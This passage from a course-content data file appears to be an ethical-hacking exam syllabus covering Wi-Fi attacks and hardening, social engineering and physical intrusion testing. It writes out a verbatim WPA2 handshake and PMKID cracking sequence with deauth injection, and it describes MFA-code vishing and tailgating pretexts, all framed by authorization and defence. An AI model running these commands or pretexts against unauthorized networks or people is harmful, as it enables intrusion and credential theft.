                ["Evil twin", "hostapd + dnsmasq clone", "Same SSID, two BSSIDs, RSSI anomaly", "802.1X with server-cert validation"],
                ["Deauth flood", "aireplay-ng -0", "Deauth frame counts in WIPS", "PMF (802.11w)"],
                ["Rogue AP", "any AP + LAN port", "Controller rogue-AP alerts", "Port security, NAC, alert triage"],
              ],
            },
            examQuestions: [
              {
                q: "Explain the major Wi-Fi attacks against protocols, clients, availability and infrastructure. Pair each attack with its tool, its defender-visible artefact and its control, and support with the GPU cracking economics and a rogue-AP process case.",
                marks: 14,
                outline: [
                  "Protocol: handshake capture + aircrack-ng; PMKID clientless; WPS Pixie Dust",
                  "Client: evil twin SSID clone + captive portal phishing; KARMA probes",
                  "Availability: deauth frames - unauthenticated without PMF; aireplay-ng -0",
                  "Infrastructure: rogue AP bridging the LAN; guest VLAN misbridge",
                  "Economics: 8-char lowercase minutes, mixed hours-days, 12-char random centuries",
                  "Artefacts: EAPOL storms, duplicate BSSID, deauth counts, controller alerts",
                  "Process case: 2 rogue corporate SSIDs flagged 6 weeks untriaged -> A09-class finding",
                ],
              },
              {
                q: "Why does enabling Protected Management Frames (802.11w) neutralize most deauthentication attacks?",
                marks: 7,
                outline: [
                  "Classic deauth frames are unauthenticated management frames",
                  "Any attacker in range can spoof the AP's address and inject them",
                  "PMF adds integrity protection (BCIP/CCMP) to management frames",
                  "Spoofed frames now fail verification and are dropped",
                  "Residual risk: attackers fall back to RF jamming or client-side tricks",
                ],
              },
            ],
          },
          {
            number: "3.3",
            title: "Wireless penetration testing techniques",
            body: [
              "The wireless engagement follows a repeatable pipeline: authorize and define (which SSIDs, which BSSIDs, which physical site, whether deauth is permitted), survey (airmon-ng start wlan0 creates wlan0mon; airodump-ng wlan0mon maps every SSID, BSSID, channel, encryption and client within range - a mid-size site yields 8-15 SSIDs and 30-80 devices), classify (corporate Enterprise vs guest vs IoT PSK vs open), then attack the classified targets in RoE order. The survey artifact - a table of SSID/BSSID/channel/encryption/client-count - is the section of the report the wireless findings hang from.",
              "The canonical WPA2-PSK crack sequence, examinable line by line: airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon focuses the capture on the target channel and BSSID; wait for or force a handshake (aireplay-ng -0 1 -a BSSID -c CLIENT_MAC sends one deauth); the WPA HANDSHAKE label confirms capture; then aircrack-ng -w wordlist.lst capture.cap runs PBKDF2 over candidates - 10k common-password list on CPU takes minutes, rockyou.txt (14 million) takes hours on CPU or minutes on GPU rigs at ~100k-1M guesses/second per card. The PMKID variant skips the deauth: hcxdumptool -i wlan0mon -o pmkid.pcapng captures the AP's EAPOL M1, then hcxtools converts and hashcat -m 22000 cracks offline. Enterprise networks resist all of this and shift the test to rogue-AP, evil-twin and client-side attacks instead - stating that pivot is itself an exam mark.",
              "Tooling literacy separates the report from the story: the aircrack-ng suite (monitor mode, capture, inject, crack), Kali's pre-installed drivers and the Alfa AWUS036ACH-class adapter (monitor + injection capable), hashcat with -m 22000 (PMKID/EAPOL) and -m 2500-era handshake modes, Wifite for automation (with the caution that automation hides the steps the exam wants explained), and honeypot tooling (hostapd configs) for evil-twin work. Physical discipline matters as much: a wireless test is a site visit - badge or escort rules apply, the tester logs every location a capture was taken, and attacks stop the moment a legitimate user's connectivity is affected beyond the RoE window.",
              "Exam framing: 'Describe the methodology and tools for wireless penetration testing' is a 7-14 mark standard. Walk the five pipeline stages, give the airodump/aireplay/aircrack command sequence verbatim with the rockyou/GPU numbers, add the PMKID clientless variant, and close with the Enterprise pivot and the site-visit discipline.",
            ],
            keyTerms: [
              { term: "Monitor mode", definition: "Adapter mode capturing all 802.11 frames without associating - the prerequisite for every wireless tool." },
              { term: "aircrack-ng suite", definition: "The standard wireless toolkit: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng." },
              { term: "hashcat -m 22000", definition: "The WPA-PMKID+EAPOL cracking mode for GPU rigs." },
              { term: "Site survey", definition: "The SSID/BSSID/channel/encryption inventory that anchors the wireless report." },
            ],
            diagram: {
              kind: "flow",
              title: "The wireless engagement pipeline",
              caption: "Survey classifies the target; the crack path follows the classification.",
              steps: [
                { label: "Authorize", note: "SSIDs, site, deauth yes/no" },
                { label: "Survey", note: "airodump-ng: 8-15 SSIDs, 30-80 devices" },
                { label: "Classify", note: "Enterprise / guest / IoT PSK / open" },
                { label: "Capture", note: "handshake or PMKID on PSK targets" },
                { label: "Crack", note: "aircrack-ng / hashcat offline" },
                { label: "Report", note: "survey table + findings + controls" },
              ],
            },
            bullets: [
              "Pipeline: authorize -> survey -> classify -> attack -> crack -> report; the survey table anchors everything.",
              "Monitor mode first: airmon-ng start wlan0 -> wlan0mon; injection-capable adapter required (Alfa class).",
              "PSK crack: airodump -c 6 --bssid ... -w cap; aireplay -0 1 deauth; aircrack -w rockyou.lst.",
              "Numbers: rockyou = 14M candidates; CPU hours, GPU minutes at 100k-1M guesses/second.",
              "PMKID variant: hcxdumptool captures EAPOL M1 - no client or deauth needed; hashcat -m 22000.",
              "Enterprise targets pivot to rogue-AP/evil-twin/client attacks; site-visit discipline logs every capture location.",
            ],
            callout: {
              type: "exam",
              title: "Write the commands, then the numbers",
              body: "The wireless answer scores highest when the command sequence is verbatim and the cracking economics are concrete: capture 4 EAPOL frames, run 14 million candidates, quote guesses-per-second. Examiners mark tool literacy and quantitative judgment as separate lines.",
            },
            codeExample: {
              language: "bash",
              caption: "wifi.sh - the canonical WPA2-PSK engagement",
              code: `# 1. monitor mode
airmon-ng start wlan0                  # -> wlan0mon

# 2. survey the site
airodump-ng wlan0mon                   # 8-15 SSIDs seen

# 3. focus and capture the handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# "WPA HANDSHAKE AA:BB:CC:DD:EE:FF" confirms capture

# 4. crack offline
aircrack-ng -w rockyou.lst cap-01.cap  # CPU path
hashcat -m 22000 hash.22000 word.lst   # GPU path

# 5. clientless alternative
hcxdumptool -i wlan0mon -o pmkid.pcapng
hcxpcapngtool -o hash.22000 pmkid.pcapng`,
            },
            examQuestions: [
              {
                q: "Describe the complete methodology of a wireless penetration test: authorization and scoping, survey, classification, the WPA2-PSK crack sequence with commands and cracking economics, the PMKID clientless variant, and the pivot for Enterprise targets.",
                marks: 14,
                outline: [
                  "Authorize: SSIDs, BSSIDs, site rules, deauth permission",
                  "Survey: airmon-ng monitor mode; airodump-ng maps 8-15 SSIDs and 30-80 devices",
                  "Classify: Enterprise vs guest vs IoT PSK vs open",
                  "PSK crack: airodump capture -> aireplay -0 1 deauth -> WPA HANDSHAKE confirmed",
                  "Crack: aircrack-ng with rockyou (14M) - CPU hours, GPU minutes at 100k-1M guesses/s",
                  "PMKID: hcxdumptool EAPOL M1, no deauth or client needed; hashcat -m 22000",
                  "Enterprise pivot: rogue AP, evil twin, client-side; site-visit discipline and capture log",
                ],
              },
              {
                q: "Explain why handshake cracking succeeds or fails as a function of passphrase choice, with the worked timings.",
                marks: 7,
                outline: [
                  "Captured handshake enables offline PBKDF2 guessing",
                  "PBKDF2 cost: 4096 iterations per candidate slows CPU, not GPUs proportionally",
                  "8-char lowercase: minutes; 8-char mixed: hours-days; 12-char random: centuries",
                  "Conclusion: length dominates complexity for PSKs",
                  "Enterprise/SAE removes offline guessing entirely",
                ],
              },
            ],
          },
          {
            number: "3.4",
            title: "Securing wireless networks",
            body: [
              "The defence answer mirrors the attack taxonomy, and the exam expects it as a control list mapped to the findings. Protocol layer: WPA3 where hardware supports it, WPA2-Enterprise with 802.1X everywhere else, AES-CCMP only (TKIP and WEP disabled at the controller), 12+ character PSKs where Personal mode is unavoidable, and PMF enabled - which together eliminate WEP/TKIP classes, offline PSK cracking on corporate SSIDs, and deauth floods. Authentication layer: certificate validation on supplicants (the evil-twin counter), machine + user certificates, and MFA on the VPN that wireless users ultimately reach. Architectural layer: guest networks on isolated VLANs with client isolation and internet-only routing, IoT devices quarantined on their own SSID/VLAN with firewall rules to nowhere, and rogue-AP detection with a named owner for the alerts - the process fix for the 6-week-untriaged finding of section 3.2.",
              "The worked hardening case shows the economics. A mid-size office running WPA2-PSK on corporate SSID + open guest + 4 forgotten IoT SSIDs converts to: corporate on 802.1X (cert deployment via MDM, 2 days), guest re-isolated (1 hour), IoT SSIDs moved to a quarantined VLAN with device inventory (2 days), PMF on (controller config, 1 hour). Post-hardening re-test results: handshake attacks return nothing (no PSK to crack on corporate), evil twin fails certificate validation, deauth fails under PMF, and the IoT pivot dies at the VLAN firewall. Residual risk is honestly stated: physical RF jamming remains possible, and the guest portal remains a phishing surface mitigated by user awareness rather than technology.",
              "Verification closes the loop and is itself examinable: every control gets a re-test step from section 3.3's pipeline (survey again, confirm Enterprise-only on corporate SSIDs, confirm PMF capability flags, attempt one evil twin to confirm certificate failure). The sustainability controls are annual site surveys, wireless controller alert triage in the SOC's runbook, and asset management that registers every AP and IoT radio - because the forgotten SSID of this year is the breach entry of next year. The exam's mitigation-question rubric rewards exactly this pairing: control -> which attack it kills -> how you re-test it.",
              "Exam framing: 'How do you secure a wireless network?' is a 7-mark standard; 'map controls to the attacks of Unit 3.2 and describe verification' is 14. Structure by layer (protocol, authentication, architecture), give the worked hardening case with its two-day cost lines and post-hardening re-test matrix, and close with sustainability controls.",
            ],
            keyTerms: [
              { term: "802.1X / NAC", definition: "Per-device authentication and posture checking before any VLAN access is granted." },
              { term: "PMF (802.11w)", definition: "Protected Management Frames - integrity-protected management traffic defeating deauth spoofing." },
              { term: "Client isolation", definition: "Guest-network setting preventing clients from reaching each other or the corporate LAN." },
              { term: "Rogue-AP detection", definition: "Controller/WIPS capability that flags unauthorized APs - requires a triage owner to matter." },
            ],
            diagram: {
              kind: "compare",
              title: "Attack classes vs the controls that kill them",
              caption: "Every row is a pair: the attack from Unit 3.2 and the control that closes it.",
              left: {
                heading: "Attack classes",
                items: [
                  "Offline PSK cracking (handshake/PMKID)",
                  "Evil twin + captive portal phishing",
                  "Deauthentication floods",
                  "Rogue AP bridging; IoT SSID pivot",
                ],
              },
              right: {
                heading: "Controls",
                items: [
                  "802.1X + 12+ char PSK + SAE upgrade",
                  "Certificate validation on supplicants",
                  "PMF (802.11w) enabled fleet-wide",
                  "VLAN quarantine + rogue detection with owner",
                ],
              },
            },
            bullets: [
              "Protocol controls: WPA3/SAE or WPA2-Enterprise, AES-CCMP only, PMF on, 12+ char PSKs where Personal persists.",
              "Authentication controls: certificate validation, machine certs via MDM, MFA on downstream VPN.",
              "Architectural controls: guest isolation, IoT VLAN quarantine with deny-all firewall, registered AP inventory.",
              "Worked conversion: PSK corporate + open guest + 4 IoT SSIDs -> 802.1X (2 days) + isolation (1 h) + quarantine (2 days).",
              "Post-hardening re-test: no corporate PSK to crack; evil twin fails cert validation; deauth dies under PMF.",
              "Sustainability: annual surveys, SOC triage runbook for rogue alerts, asset registration for every radio.",
            ],
            callout: {
              type: "tip",
              title: "Say which attack each control kills",
              body: "A mitigation list without attack pairing reads as boilerplate. The high-mark form is a three-column sentence: 'PMF is enabled, which removes the deauth class from section 3.2, and the re-test confirms clients ignore unauthenticated management frames.' Pair, then verify, then say so.",
            },
            table: {
              caption: "The hardening plan and its re-test verification.",
              headers: ["Control", "Kills", "Verification re-test"],
              rows: [
                ["802.1X + SAE", "Offline PSK cracking", "Survey shows no PSK corporate SSID"],
                ["Certificate validation", "Evil twin / portal phishing", "Test AP fails client association"],
                ["PMF (802.11w)", "Deauth floods", "Deauth burst has no client effect"],
                ["IoT VLAN quarantine", "Forgotten-SSID pivot", "IoT device cannot reach corporate subnets"],
                ["Rogue alert triage owner", "Untriaged rogue APs", "Injected rogue flagged and logged same day"],
              ],
            },
            examQuestions: [
              {
                q: "Explain how to secure an enterprise wireless network. Organize controls by protocol, authentication and architecture layers, map each control to the attack class it defeats, and describe the re-test verification and sustainability measures.",
                marks: 14,
                outline: [
                  "Protocol: WPA3/SAE or WPA2-Enterprise, AES-CCMP only, PMF on, long PSKs where needed",
                  "Authentication: 802.1X per-user, certificate validation on supplicants, MDM-deployed machine certs",
                  "Architecture: guest VLAN isolation, IoT quarantine VLAN with deny-all, AP inventory",
                  "Pairing: PSK crack -> 802.1X/SAE; evil twin -> cert validation; deauth -> PMF; pivot -> VLAN firewall",
                  "Worked conversion cost: 802.1X 2 days, guest isolation 1 hour, IoT quarantine 2 days",
                  "Re-test matrix: survey, evil-twin attempt, deauth burst, IoT reachability probe",
                  "Sustainability: annual survey, SOC rogue-alert runbook, asset registration for all radios",
                ],
              },
              {
                q: "Why is client isolation plus VLAN segmentation the standard design for guest Wi-Fi, and what does it not protect against?",
                marks: 7,
                outline: [
                  "Guests are untrusted: no reason for guest-to-guest or guest-to-LAN reachability",
                  "Client isolation blocks ARP/peer attacks inside the guest network",
                  "VLAN + firewall rules block pivots into corporate subnets",
                  "Does not protect against internet-facing phishing via the captive portal",
                  "Residual: malicious guests can still attack external targets from your IP range",
                ],
              },
            ],
          },
          {
            number: "3.5",
            title: "Social engineering techniques and tactics",
            body: [
              "Social engineering attacks the human control layer, and it is the highest-success attack class in the industry - phishing accounts for the initial access in a third to half of real breaches, against a technical control set that costs orders of magnitude more than the phishing kit that defeats it. The taxonomy by channel: email (phishing at scale, spear phishing researched per target, whaling for executives, business email compromise where a spoofed CFO requests a wire transfer), voice (vishing - the IT helpdesk call that 'resets' MFA), SMS (smishing - the parcel and payroll-links class), and in-person (pretexting, tailgating through badge doors, impersonating a contractor). The psychological levers are constant across channels: authority, urgency, scarcity, social proof and fear - the tester's report names which lever each simulated attack used.",
              "The worked campaign shows the metrics examiners want. A two-week simulated campaign against a 200-employee firm: 500 phishing emails sent from a lookalike domain (company-hr.co vs company.co) using the firstname.lastname format harvested in Unit 1.5; open rate 62%, credential-submission rate 18% (90 employees), of which 40 were privileged users; the follow-up vishing round to finance ('IT here, your MFA is expiring, read me the code') succeeded against 3 of 10 targets, yielding one full MFA-bypass. Those numbers - 62/18/3 - are the report's impact core, and they map directly to controls: email authentication (SPF/DKIM/DMARC would have flagged the lookalike domain), FIDO2/phishing-resistant MFA (kills the code-reading vector), and awareness training with reporting metrics.",
              "The tactic layer is what separates technique lists from analysis: reconnaissance first (the LinkedIn map and email format from Unit 1.5 select the pretext), pretext consistency (the fake IT ticket number, the real manager's name in the signature), channel matching (finance staff get invoice lures, HR gets CV lures), and the reporting feedback loop (every simulated credential submission generates an instant coaching page, and the metric that matters is time-to-report, not just click rate - a firm whose median report time drops from 4 hours to 12 minutes has materially reduced its real exposure). RoE discipline is acute here: simulated attacks target in-scope employees only, credentials harvested are used only to prove the access chain, and no real data is read.",
              "Exam framing: 'Explain social engineering techniques and how to mitigate them' is a 7-14 mark staple. Give the channel taxonomy with the lever each exploits, work the 62/18/3 campaign numbers, name the tactic layer, and close with the control mapping - DMARC, phishing-resistant MFA, reporting-time metrics.",
            ],
            keyTerms: [
              { term: "Phishing", definition: "Mass email deception; spear phishing is targeted per person, whaling targets executives." },
              { term: "BEC", definition: "Business Email Compromise - impersonating an executive or vendor to redirect payments." },
              { term: "Vishing", definition: "Voice phishing - the helpdesk pretext that extracts MFA codes or password resets." },
              { term: "Phishing-resistant MFA", definition: "FIDO2/WebAuthn hardware keys - bound to origin, immune to credential-phishing relays." },
            ],
            diagram: {
              kind: "fork",
              title: "The simulated campaign decision tree",
              caption: "Channel and pretext follow the recon; the lever is named per attack.",
              start: "Campaign target set",
              branches: [
                { label: "Broad awareness goal", outcome: "mass phishing with lookalike domain; measures open/submit rates", good: true },
                { label: "Privileged-user risk", outcome: "spear phishing + vishing to MFA-reset; measures bypass count", good: true },
                { label: "Payment-process risk", outcome: "BEC wire-change pretext to finance; measures process catches", good: true },
                { label: "Real data exfiltration", outcome: "out of scope - RoE forbids; proof stops at access chain", good: false },
              ],
            },
            bullets: [
              "Channels: email (phish/spear/whale/BEC), voice (vishing), SMS (smishing), in-person (pretext, tailgating).",
              "Levers: authority, urgency, scarcity, social proof, fear - name the lever per simulated attack.",
              "Worked campaign: 500 emails, 62% open, 18% credential submission, 40 privileged users, 3/10 vishing, 1 MFA bypass.",
              "Recon feeds pretext: firstname.lastname format + manager names from Unit 1.5 OSINT.",
              "Metric that matters: median time-to-report (4 hours -> 12 minutes) over raw click rate.",
              "Controls: SPF/DKIM/DMARC, FIDO2 keys, reporting culture, RoE-bounded credential use.",
            ],
            callout: {
              type: "warning",
              title: "Simulated phishing has hard edges",
              body: "Social-engineering simulations need their own consent paragraph in the RoE: named in-scope population, no real data access, credential use limited to proving the chain, and an instant opt-out for distressed targets. An awareness test that humiliates an employee becomes an HR incident, not a security win.",
            },
            table: {
              caption: "Channel taxonomy with levers and primary controls.",
              headers: ["Channel", "Signature tactic", "Lever exploited", "Primary control"],
              rows: [
                ["Email - mass", "Lookalike domain lure", "Urgency + curiosity", "DMARC + reporting button"],
                ["Email - spear/BEC", "CFO wire-transfer pretext", "Authority", "Out-of-band payment verification"],
                ["Voice", "MFA-reset helpdesk call", "Authority + urgency", "Phishing-resistant MFA, callback policy"],
                ["SMS", "Parcel/payroll link", "Scarcity", "URL inspection training"],
                ["In-person", "Tailgating with hands full", "Social proof", "Badge culture, man-trap doors"],
              ],
            },
            examQuestions: [
              {
                q: "Explain social engineering attacks and their countermeasures. Give the channel taxonomy with the psychological lever each exploits, work through a simulated campaign with its metric chain, and map controls to the vectors.",
                marks: 14,
                outline: [
                  "Channel taxonomy: mass/spear/whaling email, BEC, vishing, smishing, in-person pretexting",
                  "Levers: authority, urgency, scarcity, social proof, fear",
                  "Worked campaign: 500 emails -> 62% open -> 18% submit -> 40 privileged; vishing 3/10 -> 1 MFA bypass",
                  "Recon input: harvested email format and names select pretext",
                  "Tactic layer: pretext consistency, channel matching, coaching feedback loop",
                  "Metric: time-to-report 4 hours -> 12 minutes as the real exposure measure",
                  "Controls: DMARC/SPF/DKIM, FIDO2 MFA, out-of-band verification, awareness metrics",
                ],
              },
              {
                q: "Why is FIDO2/WebAuthn called phishing-resistant, unlike OTP-based MFA?",
                marks: 7,
                outline: [
                  "OTP codes can be relayed: attacker asks the victim to read them",
                  "FIDO2 keys sign a challenge bound to the legitimate origin",
                  "A lookalike domain fails origin binding - the key refuses to sign",
                  "No shared secret is transmitted at all",
                  "Worked case: the 3/10 vishing successes die against a hardware key",
                ],
              },
            ],
          },
          {
            number: "3.6",
            title: "Physical security vulnerabilities and testing",
            body: [
              "Physical testing asks the question every digital control assumes away: can an attacker reach the hardware? The target inventory: entry controls (badge readers, their bypass behaviors and door schedules), perimeter (fences, gates, loading docks, smoking-corner doors propped open), surveillance (camera coverage and blind spots, retention, who watches), device exposure (unlocked server cabinets, network ports in lobbies, trash with intact documents), and environmental systems (HVAC controllers on the network, UPS panels). The testing techniques are deliberately low-tech because the failures are: tailgating through a badge-controlled door behind a badge-holder (success rates in real engagements run 50-90%), badge cloning (a 30-second read of a low-frequency HID card with a portable tool), lock picking and bypass tools on cabinet locks, and document harvesting from recycling bins (still a finding in a sizable share of audits).",
              "The worked case from a real pattern: an authorized tester with a contractor hi-vis vest and a clipboard carries a ladder towards the loading dock, holds the door for a passing employee, and is inside in 90 seconds; the nearest network cabinet is unlocked, a lobby wall port is live, and a small device bridging lobby VLAN to the internet is planted (then removed, documented). The chain converts to digital impact directly: from that bridge, internal scanning of section 1.6 begins inside the perimeter - the entire external attack surface of Units 1-2 is bypassed by a 90-second walk. The report's impact sentence writes itself: 'the perimeter digital controls assume a physically closed building; this assumption failed in 90 seconds on day one'.",
              "The control mapping pairs each failure with its fix: tailgating -> man-trap/turnstile doors plus a badge culture audit; badge cloning -> migrate low-frequency prox cards to smart cards with challenge-response; unlocked cabinets -> door-contact sensors alarmed to the SOC and an audit of cabinet keys; live lobby ports -> NAC on every wall port (unknown MAC gets a quarantine VLAN); document disposal -> cross-cut shredding contracts with bin audits. Testing discipline is where physical work differs from digital: consent covers named buildings and hours, the tester never touches production hardware, planted devices are inventoried and removed within the day, and an escort or immediate disclosure protocol exists for being challenged - because being caught unannounced in a bank's server room without a pre-agreed script is a police conversation, not a pentest step.",
              "Exam framing: 'Explain physical security vulnerabilities and their testing' is a 7-mark standard. List the target inventory, the low-tech techniques with the 50-90% tailgating number, work the 90-second case into the digital chain, and close with the control pairs and the testing discipline paragraph.",
            ],
            keyTerms: [
              { term: "Tailgating", definition: "Following an authorized person through an access-controlled door without badging - the highest-success physical attack." },
              { term: "Badge cloning", definition: "Copying a low-frequency prox card's credential onto a writable card or emulator." },
              { term: "NAC", definition: "Network Access Control - unknown devices on wall ports land in a quarantine VLAN." },
              { term: "Man-trap", definition: "A two-door vestibule admitting one authenticated person at a time - the tailgating kill." },
            ],
            diagram: {
              kind: "layers",
              title: "Physical defence in depth - each layer assumes the last failed",
              caption: "The tester's 90-second case fell through four layers at once; depth means no single hole is fatal.",
              layers: [
                { label: "Perimeter", note: "fence, gate, loading dock, CCTV coverage" },
                { label: "Building entry", note: "badge + man-trap + reception challenge" },
                { label: "Zone access", note: "server-room badge + door-contact alarms" },
                { label: "Device layer", note: "locked cabinets, NAC on wall ports" },
                { label: "Data layer", note: "full-disk encryption, shredding, clean desk" },
              ],
            },
            bullets: [
              "Target inventory: entry controls, perimeter, surveillance, device exposure, environmental systems.",
              "Techniques: tailgating (50-90% success in engagements), badge cloning (30-second LF read), lock bypass, bin harvesting.",
              "Worked case: contractor pretext -> door held -> unlocked cabinet -> lobby port -> planted bridge -> internal scan begins.",
              "Impact sentence: 90 seconds bypasses the entire external attack surface of Units 1-2.",
              "Control pairs: man-traps, smart-card migration, alarmed cabinets, NAC ports, shredding contracts.",
              "Discipline: named buildings and hours, no production hardware touched, same-day device removal, challenge script.",
            ],
            callout: {
              type: "warning",
              title: "Physical testing is the RoE's sharpest edge",
              body: "Physical intrusions carry real legal and personal risk: trespass laws, alarm responses, armed guards. Every move needs pre-agreed boundaries, a scripted response to being challenged ('I am the authorized tester, here is the letter and the contact number'), and an immediate abort protocol. No finding is worth an unscheduled police encounter.",
            },
            table: {
              caption: "Physical failure-to-fix pairs.",
              headers: ["Observed failure", "Impact", "Fix"],
              rows: [
                ["Tailgating succeeds (50-90%)", "Perimeter bypass in seconds", "Man-trap/turnstile + badge culture audit"],
                ["LF prox badges", "30-second credential clone", "Smart cards with challenge-response"],
                ["Unlocked network cabinet", "Device implant and tap", "Door-contact alarms + key audit"],
                ["Live lobby wall ports", "Internal bridge into LAN", "NAC quarantine on all ports"],
                ["Intact documents in bins", "Data harvesting", "Cross-cut shredding + bin audits"],
              ],
            },
            examQuestions: [
              {
                q: "Explain physical security testing: the target inventory, the low-tech attack techniques with success metrics, a worked chain from door to internal network, and the control mapping with testing discipline.",
                marks: 14,
                outline: [
                  "Inventory: entry controls, perimeter, CCTV, device exposure, environmental systems",
                  "Techniques: tailgating 50-90%, badge cloning 30 s, lock bypass, document harvesting",
                  "Worked chain: contractor pretext -> held door -> unlocked cabinet -> lobby port -> planted bridge",
                  "Digital impact: internal scanning starts inside the perimeter; external controls bypassed",
                  "Control pairs: man-traps, smart cards, alarmed cabinets, NAC, shredding",
                  "Depth-in-depth: perimeter -> entry -> zone -> device -> data layers",
                  "Discipline: named scope and hours, no hardware touch, same-day removal, challenge script",
                ],
              },
              {
                q: "How does NAC on wall ports neutralize the planted-bridge attack, and what does it not address?",
                marks: 7,
                outline: [
                  "Unknown MAC at the lobby port lands in a quarantine VLAN",
                  "Quarantine allows only remediation traffic - no corporate reachability",
                  "The planted bridge becomes a dead end instead of a pivot",
                  "Does not address unlocked cabinets (implant placement) or tailgating itself",
                  "Layered answer: NAC is the device layer; entry layers still need man-traps and alarms",
                ],
              },
            ],
          },
          {
            number: "3.7",
            title: "Mitigating social engineering and physical risks",
            body: [
              "Mitigation for the human layer is a programme, not a product: awareness training with metrics (click rate, report rate, time-to-report - the 62/18/3 numbers of section 3.5 tracked quarterly), phishing-resistant MFA on every identity that matters, out-of-band verification for payment and credential-change requests, and a reporting culture where 'I clicked and reported in 2 minutes' is rewarded rather than punished. The physical programme mirrors it: layered entry controls (man-traps, badge + challenge), device-layer controls (alarmed cabinets, NAC ports, disk encryption so a stolen laptop is an asset-loss ticket, not a breach), data-layer controls (clean-desk, shredding), and process controls (visitor management, contractor escorting, incident drills that include a social-engineering scenario).",
              "The programme's engine is the measure-fix-retest cycle, and the worked numbers show it working. Baseline quarter: 18% credential submission, median report time 4 hours, 2 unlocked cabinets, tailgating success 4 of 5 attempts. After one quarter of targeted controls (FIDO2 rollout to the 40 privileged users, DMARC enforcement, man-trap on the main door, cabinet alarms): submission 11% (residual = the users who typed credentials into the lookalike page despite the warning banner), report time 12 minutes, cabinets 0, tailgating 1 of 5. The residual analysis is the exam's analysis mark: submission rate plateaus because humans err, which is exactly why the control that matters is phishing-resistant MFA (making the error harmless) rather than perfect awareness (making humans perfect).",
              "Two closing disciplines complete the answer. First, the compounding defence: no single control stops the campaign - DMARC flags the domain, MFA kills credential relay, cabinet alarms catch the implant, and reporting metrics shrink the window - so the exam answer presents defence as a stack with each layer buying time, not as a silver bullet. Second, honest residual-risk language: jamming, insider collusion and well-funded pretexting remain possible; the programme's goal is to raise attacker cost and detection speed, not to promise impossibility. Examiners consistently reward answers that end by naming what the controls do not fix.",
              "Exam framing: 'Discuss mitigation strategies for social engineering and physical security risks' is a 7-14 mark closer for this unit. Structure as two programmes (human, physical) mapped to the unit's findings, work the measure-fix-retest quarter with before/after numbers, present the compounding-defence stack, and close with residual risk.",
            ],
            keyTerms: [
              { term: "Time-to-report", definition: "Median minutes from attack contact to user report - the awareness programme's core metric." },
              { term: "Out-of-band verification", definition: "Confirming payment or credential changes on a known channel, never the one the request arrived on." },
              { term: "Clean-desk policy", definition: "No sensitive documents or sessions left unattended - the data-layer physical control." },
              { term: "Defence in depth", definition: "Layered controls each buying attacker time; no single layer is trusted to hold." },
            ],
            diagram: {
              kind: "cycle",
              title: "The measure-fix-retest programme loop",
              caption: "Quarterly metrics drive controls; controls are verified by retest, not by purchase.",
              steps: [
                { label: "Measure", note: "18% submit, 4 h report, 2 cabinets, 4/5 tailgate" },
                { label: "Fix", note: "FIDO2, DMARC, man-trap, alarms" },
                { label: "Retest", note: "same simulations, same buildings" },
                { label: "Analyse residual", note: "11% submit plateau -> MFA makes errors harmless" },
                { label: "Report to board", note: "risk trend, not tool list" },
              ],
            },
            bullets: [
              "Human programme: metrics-driven awareness, FIDO2 MFA, out-of-band verification, reporting culture.",
              "Physical programme: man-traps and badge challenge, alarmed cabinets, NAC ports, disk encryption, clean desk.",
              "Worked quarter: 18% -> 11% submission, 4 h -> 12 min report time, 2 -> 0 cabinets, 4/5 -> 1/5 tailgating.",
              "Residual analysis: humans err, so make errors harmless (MFA) rather than expecting perfection.",
              "Compounding stack: DMARC + MFA + alarms + reporting each buy time; no silver bullet.",
              "Close with what remains: jamming, collusion, funded pretexting - cost-raising, not impossibility.",
            ],
            callout: {
              type: "tip",
              title: "Report risk as a trend line",
              body: "Boards fund programmes, not tools. The mitigation answer that shows the quarter-on-quarter metric trend - submission rate, report time, physical failures - reads as management maturity, which is exactly what this unit's closing question is testing.",
            },
            table: {
              caption: "The measure-fix-retest quarter, before and after.",
              headers: ["Metric", "Baseline", "After one quarter", "Control applied"],
              rows: [
                ["Credential submission rate", "18%", "11%", "FIDO2 for 40 privileged + DMARC"],
                ["Median time-to-report", "4 hours", "12 minutes", "Coaching page + reporting culture"],
                ["Unlocked cabinets", "2", "0", "Door-contact alarms"],
                ["Tailgating success", "4/5 attempts", "1/5 attempts", "Man-trap on main entry"],
                ["Rogue-AP alert triage", "6 weeks unactioned", "Same-day", "Named SOC owner + runbook"],
              ],
            },
            examQuestions: [
              {
                q: "Discuss a complete mitigation programme for social engineering and physical security risks. Present the human and physical control stacks, work through one measure-fix-retest cycle with before/after numbers, and close with residual-risk analysis.",
                marks: 14,
                outline: [
                  "Human stack: awareness metrics, FIDO2 MFA, out-of-band verification, reporting culture",
                  "Physical stack: man-traps, alarmed cabinets, NAC ports, disk encryption, clean desk",
                  "Measure: 18% submission, 4 h report, 2 cabinets, 4/5 tailgate baseline",
                  "Fix: FIDO2 for 40 privileged, DMARC, man-trap, cabinet alarms",
                  "Retest: 11% submission, 12 min report, 0 cabinets, 1/5 tailgate",
                  "Residual analysis: human error plateaus -> MFA makes errors harmless",
                  "Compounding defence + honest residuals: jamming, collusion, funded adversaries remain",
                ],
              },
              {
                q: "Explain why awareness training alone cannot eliminate phishing risk, using the metric plateau argument.",
                marks: 7,
                outline: [
                  "Humans err under pressure; training reduces but never zeroes clicks",
                  "Submission rate plateaus (18% -> 11%) despite training",
                  "The technical backstop - FIDO2 - makes the residual error harmless",
                  "Training's real leverage is time-to-report: 4 h -> 12 min shrinks attacker window",
                  "Conclusion: pair training with phishing-resistant controls, not instead of them",
                ],
              },
            ],
          },
        ],
      },
    },
    {
      number: 4,
      roman: "IV",
      title: "Cryptography, Secure Channels and Reporting",
      summary:
        "Unit IV covers the basics of cryptography, algorithms and protocols, encryption and key management, secure communication channels, and the reporting craft - documentation, CVSS-scored findings, prioritization and stakeholder communication.",
      chapter: {
        number: "04",
        title: "Cryptography and the Report",
        intro:
          "Unit IV covers cryptographic basics, algorithms and protocols, key management, secure channels, and the reporting pipeline - documentation, CVSS scoring, prioritization, remediation and post-testing activities.",
        inOneBreath:
